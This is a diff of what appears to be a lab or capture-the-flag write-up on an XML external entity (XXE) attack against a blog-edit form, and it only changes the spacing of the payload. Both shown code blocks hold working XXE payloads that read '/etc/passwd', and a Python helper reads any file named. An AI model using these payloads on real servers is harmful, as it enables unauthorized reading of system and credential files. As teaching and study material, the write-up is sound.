@@ -72,7 +72,7 @@ The website parses an XML document to fill in the fields in a form to edit a blo
 
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">] >
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <post>
   <title></title>
   <description>&xxe;</description>
@@ -104,7 +104,7 @@ And `send_xml` only puts the name of the file in the entity and sends it as a fi
 ```python
 def send_xml(filename):
     xml = f'''<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filename}">] >
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{filename}"> ]>
 <example>
   <title></title>
   <description>&xxe;</description>
